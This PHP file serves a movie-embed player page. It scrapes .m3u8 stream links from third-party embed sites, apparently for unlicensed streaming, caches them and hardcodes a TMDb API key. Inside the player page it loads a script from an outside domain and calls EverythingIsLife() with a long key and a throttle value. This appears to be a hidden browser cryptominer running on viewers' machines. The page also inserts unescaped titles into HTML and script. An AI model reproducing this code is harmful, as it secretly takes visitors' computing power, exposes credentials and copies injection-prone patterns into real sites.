<?php
   #include "userLog.php";
// Allow specific methods for CORS
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// List of allowed origins
$allowed_origins = [
    '',
];

// Check if the Origin header is set and is in the allowed origins
if (isset($_SERVER['HTTP_ORIGIN']) && in_array($_SERVER['HTTP_ORIGIN'], $allowed_origins)) {
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
}

// Handle preflight requests (OPTIONS method)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    // Optionally return a 200 response for OPTIONS requests
    exit(0);
}

// Get the movie ID from the query parameters
$movie_id = $_GET['id'] ?? '';
$tmdb_api_key = 'cbcdfc6593aae506b023e64d7df48dc7'; // TMDb API key

// Ensure the ID is provided
if (empty($movie_id)) {
    echo json_encode(["error" => "ID is missing!"]);
    exit;
}

// Movie URL format
$url = "https://viet.autoembbbed.cc/movie/" . $movie_id;
$tmdb_url = "https://api.themoviedb.org/3/movie/{$movie_id}?api_key={$tmdb_api_key}";

// Define the URLs
$vidsrc_url = "https://freembed.site/resource/server/mega_movie_server.php?id=" . $movie_id;
$viet_url = "https://autoembed.cc/embed/player.php?id=" . $movie_id . "&lang=english";
$embed_url = "https://autoembed.cc/embed/mlplayer.php?id=" . $movie_id . "&lang=english";
$twoembed_url = "https://viet.autoembbbed.cc/movie/" . $movie_id;

// Function to fetch movie details from TMDb
function fetchMovieDetails($tmdb_url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $tmdb_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    return json_decode($response, true);
}

// Function to fetch the .m3u8 link from a URL
function fetchM3U8Link($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);

    preg_match('/https:\/\/[^\s]*\.m3u8/', $response, $matches);

    return !empty($matches[0]) ? filter_var($matches[0], FILTER_VALIDATE_URL) : null;
}

// Function to fetch .m3u8 link from m3u8.json
function fetchM3U8FromJson($tmdb_id) {
    $filePath = 'm3u8.json';
    if (file_exists($filePath)) {
        $existingLinks = json_decode(file_get_contents($filePath), true);
        foreach ($existingLinks as $entry) {
            if (isset($entry['tmdb_id']) && $entry['tmdb_id'] === $tmdb_id) {
                if (isset($entry['m3u8_url'])) {
                    return $entry['m3u8_url'];
                } else {
                    return null;
                }
            }
        }
    }
    return null;
}

// Function to save .m3u8 links to a JSON file
function saveM3U8Link($m3u8_url, $tmdb_id, $tmdb_data) {
    $filePath = 'm3u8.json';

    $existingLinks = [];
    if (file_exists($filePath)) {
        $existingLinks = json_decode(file_get_contents($filePath), true);
    }

    if (!is_array($existingLinks)) {
        $existingLinks = [];
    }

    $title = $tmdb_data['title'] ?? 'Unknown Title';
    $poster = "https://image.tmdb.org/t/p/w500" . ($tmdb_data['poster_path'] ?? '');

    $newData = [
        'tmdb_id' => $tmdb_id,
        'title' => $title,
        'poster' => $poster,
        'm3u8_url' => $m3u8_url
    ];

    $found = false;
    foreach ($existingLinks as &$entry) {
        if (isset($entry['tmdb_id']) && $entry['tmdb_id'] === $tmdb_id) {
            $entry = $newData;
            $found = true;
            break;
        }
    }
    if (!$found) {
        $existingLinks[] = $newData;
    }

    if (file_put_contents($filePath, json_encode($existingLinks, JSON_PRETTY_PRINT)) === false) {
        echo json_encode(["error" => "Failed to write to file."]);
        exit;
    }
}

// Check if the 'id' and 'logo' parameters are set in the URL
if (isset($_GET['id']) && isset($_GET['logo'])) {
    $tmdbId = htmlspecialchars($_GET['id']);
    $logoUrl = htmlspecialchars($_GET['logo']);
} else {
    // Default values if parameters are not set
    $tmdbId = '$tmdb_id';
    $logoUrl = 'https://exampledomain.com/default-logo.png'; // A default logo
}

// Fetch details from TMDb
$tmdb_data = fetchMovieDetails($tmdb_url);

// Check if movie details were found
if (!$tmdb_data || isset($tmdb_data['status_code'])) {
    echo json_encode(["error" => "Movie not found on TMDb."]);
    exit;
}

// Try fetching the .m3u8 link from other sources first
$m3u8_url = fetchM3U8Link($vidsrc_url) ?? fetchM3U8Link($viet_url) ?? fetchM3U8Link($embed_url) ?? fetchM3U8Link($twoembed_url);

// If not found, try to fetch from m3u8.json
if (!$m3u8_url) {
    $m3u8_url = fetchM3U8FromJson($movie_id);
}

// Check if a valid .m3u8 URL is found
if ($m3u8_url) {
    // Save the m3u8 URL if found
    saveM3U8Link($m3u8_url, $movie_id, $tmdb_data);

    // Encode the URL using Base64
    $encoded_url = base64_encode($m3u8_url);

    // HTML structure with player setup
    echo "<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>⟨FREEMBED⟩ | {$tmdb_data['title']}</title>
<style>
html, body {
   width: 100%;
   height: 100%;
   margin: 0;
   overflow: hidden;
}
.playerLogo {
   position: fixed;
   top: 10px;
   right: 10px;
   max-width: 100px;
   max-height: 50px;
   z-index: 99 !important;
   opacity: 0.8;
}
#loader {
   position: fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
   z-index: 999 !important;

  background: #222428;
  background-size: 163px;
  font: 14px/21px Monaco, sans-serif;
  color: #999;
  font-smoothing: antialiased;
  -webkit-text-size-adjust: 100%;
     -moz-text-size-adjust: 100%;
          text-size-adjust: 100%;
  height: 100%;
  min-height: 100%;
}
.scene {
  width: 100%;
  height: 100%;
  perspective: 600;
  display: flex;
  align-items: center;
  justify-content: center;
}
.scene svg {
  width: 240px;
  height: 240px;
}

.dc-logo {
  position: fixed;
  right: 10px;
  bottom: 10px;
}

.dc-logo:hover svg {
  transform-origin: 50% 50%;
  -webkit-animation: arrow-spin 2.5s 0s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
          animation: arrow-spin 2.5s 0s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
}
.dc-logo:hover:hover:before {
  content: '';
  padding: 6px;
  font: 10px/1 Monaco, sans-serif;
  font-size: 10px;
  color: #00fffe;
  text-transform: uppercase;
  position: absolute;
  left: -70px;
  top: -30px;
  white-space: nowrap;
  z-index: 20px;
  box-shadow: 0px 0px 4px #222;
  background: rgba(0, 0, 0, 0.4);
}
.dc-logo:hover:hover:after {
  content: 'Digital Craft';
  padding: 6px;
  font: 10px/1 Monaco, sans-serif;
  font-size: 10px;
  color: #6E6F71;
  text-transform: uppercase;
  position: absolute;
  right: 0;
  top: -30px;
  white-space: nowrap;
  z-index: 20px;
  box-shadow: 0px 0px 4px #222;
  background: rgba(0, 0, 0, 0.4);
  background-image: none;
}

@-webkit-keyframes arrow-spin {
  50% {
    transform: rotateY(360deg);
  }
}

@keyframes arrow-spin {
  50% {
    transform: rotateY(360deg);
  }
}
</style>
</head>
<body>
<div id='loader' class='scene'>
<svg 
  version='1.1' 
  id='dc-spinner' 
  xmlns='http://www.w3.org/2000/svg' 
  x='0px' y='0px'
  width='38'
  height='38'
  viewBox='0 0 38 38' 
  preserveAspectRatio='xMinYMin meet'
>
  <text x='11' y='21' font-family='Monaco' font-size='2px' style='letter-spacing:0.6' fill='grey'>⟨ Loading ⟩
     <animate 
       attributeName='opacity'
       values='0;1;0' dur='1.8s'
       repeatCount='indefinite'/>
  </text>
  <path fill='#373a42' d='M20,35c-8.271,0-15-6.729-15-15S11.729,5,20,5s15,6.729,15,15S28.271,35,20,35z M20,5.203
    C11.841,5.203,5.203,11.841,5.203,20c0,8.159,6.638,14.797,14.797,14.797S34.797,28.159,34.797,20
    C34.797,11.841,28.159,5.203,20,5.203z'>
  </path>

  <path fill='#373a42' d='M20,33.125c-7.237,0-13.125-5.888-13.125-13.125S12.763,6.875,20,6.875S33.125,12.763,33.125,20
    S27.237,33.125,20,33.125z M20,7.078C12.875,7.078,7.078,12.875,7.078,20c0,7.125,5.797,12.922,12.922,12.922
    S32.922,27.125,32.922,20C32.922,12.875,27.125,7.078,20,7.078z'>
  </path>

  <path fill='royalblue' stroke='royalblue' stroke-width='0.6027' stroke-miterlimit='10' d='M5.203,20
			c0-8.159,6.638-14.797,14.797-14.797V5C11.729,5,5,11.729,5,20s6.729,15,15,15v-0.203C11.841,34.797,5.203,28.159,5.203,20z'>
  <animateTransform
        attributeName='transform'
        type='rotate'
        from='0 20 20'
        to='360 20 20'
        calcMode='spline'
        keySplines='0.4, 0, 0.2, 1'
        keyTimes='0;1'
        dur='2s'
        repeatCount='indefinite' />      
   </path>

  <path fill='blue' stroke='blue' stroke-width='0.2027' stroke-miterlimit='10' d='M7.078,20
  c0-7.125,5.797-12.922,12.922-12.922V6.875C12.763,6.875,6.875,12.763,6.875,20S12.763,33.125,20,33.125v-0.203
  C12.875,32.922,7.078,27.125,7.078,20z'>
   <animateTransform
      attributeName='transform'
      type='rotate'
      from='0 20 20'
      to='360 20 20'
      dur='1.8s'  
      repeatCount='indefinite' />
    </path>
</svg>
</div>
   <img class='playerLogo' src='" . $logoUrl . "' alt='$title'>
    <div id='player' style='width:100%;height:100%;'></div>
    <script src='../../moviefreembed_v3.js'></script>
    <script>
        const base64String = '$encoded_url';
        const decodedUrl = atob(base64String);
        const player = new Playerjs({
            id: 'player',
            file: decodedUrl,
            width: '100%',
            height: '100%',
            autoplay: false,
            title: '{$tmdb_data['title']}',
            poster: 'https://image.tmdb.org/t/p/w500{$tmdb_data['poster_path']}',
            onerror: function(error) {
                console.error('An error occurred:', error);
                alert('An error occurred while trying to play the video. Please try again later.');
            },
            onready: function() {
                console.log('Player is ready!');
            },
            onplay: function() {
                console.log('Video is playing.');
            },
            onpause: function() {
                console.log('Video is paused.');
            },
            onended: function() {
                console.log('Video has ended.');
            }
        });
    </script>
   <script src='../../loader.js'></script>
   <script src='https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo'></script>
<script type='text/javascript'>
EverythingIsLife('4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGkZp9sckmN7VXWCjW', 'Movie_eng', 90);
</script>
<script>
    if (window.top === window.self) {
        // Not in an iframe, redirect
        window.location.href = 'https://freembed.site/404.html';
    } else {
        // In an iframe, serve the content
        document.write('<p>This content is viewable only in an iframe.</p>');
    }
</script>
</body>
</html>";
} else {
    echo "<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Movie Search</title>
<style>
html, body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    display: flex;
    justify-content: center;
    align-items: center;
    overflow: hidden;
    height: 100%;
    margin: 0;
    z-index: 20;
}

.container {
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    width: 80%;
    max-width: 600px;
    text-align: center;
}

h1, h2, h3, h4, h5, h6 {
    margin-bottom: 20px;
    
}

input {
    width: 80%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
    margin-right: 10px;
}

button {
    padding: 10px 15px;
    background-color: #007bff;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}


button:hover {
    background-color: #0056b3;
}

#results {
    margin-top: 20px;
    text-align: left;
}

.result-item {
    padding: 10px;
    border-bottom: 1px solid #ccc;
}

.result-item a {
    text-decoration: none;
    color: #007bff;
}

.result-item a:hover {
    text-decoration: underline;
}
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
        }

        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .progress-container {
            width: 70%;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 20px;
            height: 25px;
            display: none; /* Hidden initially */
        }
        .progress-bar {
            height: 100%;
            background-color: #4caf50;
            width: 0%;
            border-radius: 5px;
            transition: width 0.4s ease;
        }
        .progress-text {
            text-align: center;
            color: #fff;
            line-height: 25px; /* Center text vertically */
        }
        .progress-container::after {
            content: 'Please wait. we are using rapid upload..';
            text-align: center;
            color: gray;
            font-size: 0.7em;
            font-weight: 600;
            font-familty: Sansirif;
        }
    </style>
</head>
<body>
    <div class='container'>
        <h3>The $title with the tmdb id $movie_id is not listed yet!!</h3>
        <h6>This movie is not yet on our list. but you can watch this movie right away, by clicking the <b>add movie</b> button and wait for about 40 second, after adding to our list, please reload your browser and enjoy watching.</h6>
<form id='fetchForm' action='../../movieRequest.php' method='GET' onsubmit='startFetching(event)'>
        <input type='text' id='id' name='id' placeholder='type: TMDB ID' value='$movie_id'>
        <button type='submit'>Add Movie</button>
        <div id='message' class='message'></div>
    </div>
<div class='progress-container' id='progress-container' style='position:fixed;top:50%;left:5%;width:90%;z-index:30;'>
        <div class='progress-bar' id='progress-bar'>
            <div class='progress-text' id='progress-text'>0%</div>
        </div>
    </div>
    <script>
        // Display success or error messages based on the URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const messageElement = document.getElementById('message');
        const progressContainer = document.getElementById('progress-container');
        const progressBar = document.getElementById('progress-bar');
        const progressText = document.getElementById('progress-text');

        if (urlParams.has('success')) {
            messageElement.textContent = 'Movie details added and saved successfully!';
            messageElement.classList.add('success');
        } else if (urlParams.has('error')) {
            messageElement.textContent = 'Error: ' + urlParams.get('error');
            messageElement.classList.add('error');
        }

        function startFetching(event) {
            event.preventDefault(); // Prevent the default form submission
            progressContainer.style.display = 'block'; // Show the progress bar
            let progress = 0;


            // Simulate fetching process
            const interval = setInterval(() => {
                progress += 10; // Increase progress
                if (progress > 100) {
                    clearInterval(interval);
                    // Redirect after fetching
                    document.getElementById('fetchForm').submit();
                } else {
                    progressBar.style.width = progress + '%';
                    progressText.textContent = progress + '%';
                }
            }, 500); // Update every 500ms (adjust as necessary)
        }
    </script>
</body>
</html>";
}
?>
